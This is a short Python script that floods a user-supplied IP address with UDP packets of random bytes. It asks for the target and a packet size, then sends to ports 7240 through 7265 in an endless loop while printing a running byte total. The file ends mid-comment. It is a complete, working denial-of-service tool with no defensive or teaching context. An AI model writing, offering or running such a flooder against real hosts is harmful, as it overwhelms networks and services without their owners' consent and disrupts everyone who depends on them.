import socket 
import random

Sent = 0

sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

IP = input("IP: ")

Port_Start = 7240

Port_End = 7265

Bytes_Question = int(input("Bytes: "))

Bytes = random._urandom(Bytes_Question)

while True:

    for t in range (10000):

        for ports in range (Port_Start, Port_End):

            sock.sendto(Bytes, (IP, ports))

            Sent += Bytes_Question

            print("Sent: {} bytes to {}".format(Sent, IP))

            # cu
